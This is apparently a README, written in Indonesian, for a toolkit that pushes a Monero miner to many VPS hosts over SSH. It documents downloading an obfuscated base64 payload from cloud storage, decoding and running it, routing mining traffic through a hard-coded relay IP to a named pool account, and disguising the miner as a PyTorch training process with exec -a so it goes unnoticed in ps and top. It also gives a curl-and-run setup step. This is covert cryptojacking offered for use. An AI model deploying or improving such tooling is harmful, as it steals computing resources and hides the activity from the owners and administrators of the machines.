# KRX-XMR Relay Mining Automation

Toolkit otomatisasi deployment miner Monero (XMR) melalui relay TCP/TLS (HAProxy relay) ke pool **Kryptex**, lengkap dengan teknik kamuflase proses (process masking).

---

## 📂 Struktur File

1. **`bash.sh`** — Skrip setup yang dijalankan di VPS target:
   - Mengonfigurasi Hugepages untuk performa RandomX optimal.
   - Mendownload payload terenkripsi/obfuscated dari Cloudflare R2 (`signermachine.b64`), mendekode, dan memberikan hak eksekusi.
   - Mengarahkan koneksi stratum ke Relay (`43.159.60.190:443`) dengan username Kryptex (`krxXJ649DW`).
   - Melakukan kamuflase proses (process hiding) dengan menyamar sebagai proses PyTorch Distributed Training (`python3 -m torch.distributed.run`).

2. **`xmr_deploy.py`** — Skrip orkestrasi Python (Paramiko) untuk melakukan batch deployment secara otomatis ke banyak VPS sekaligus via SSH.

---

## 🚀 Cara Running di VPS Linux

### Prasyarat (Lokal / Mesin Kontrol)
Pastikan Python 3 dan pustaka `paramiko` terinstal di mesin Anda:
```bash
pip install paramiko
```

### Langkah-langkah Setup:

1. **Siapkan daftar VPS (`vps.txt`)**
   Buat file bernama `vps.txt` di direktori yang sama, isi dengan daftar IP address VPS Anda (satu IP per baris):
   ```text
   192.168.1.101
   192.168.1.102
   ```

2. **Siapkan Kunci SSH (`vps_key.pem`)**
   Letakkan private key SSH Anda di direktori yang sama dengan nama `vps_key.pem`, dan pastikan permission-nya aman:
   ```bash
   chmod 600 vps_key.pem
   ```

3. **Sesuaikan URL Payload & Relay (Jika Diperlukan)**
   Periksa variabel `SRC` / `RELAY` / `USER` di dalam `bash.sh` jika ingin mengganti endpoint R2 atau akun Kryptex.

4. **Jalankan Skrip Deployment**
   ```bash
   python3 xmr_deploy.py
   ```

---

## 🛠️ Menjalankan Manual di 1 VPS

Jika Anda ingin menjalankan langsung di satu VPS Linux via SSH:

```bash
# 1. Download dan jalankan bash.sh langsung dari R2 / GitHub
curl -sL <URL_BASH_SH> -o /tmp/bash.sh
bash /tmp/bash.sh
```

---

## 🔒 Keamanan & Catatan
- Proses disamarkan menggunakan `exec -a` agar terlihat seperti proses machine learning PyTorch di `top` / `ps aux`.
- Pastikan firewall VPS mengizinkan outbound ke port Relay (`43.159.60.190:443`).
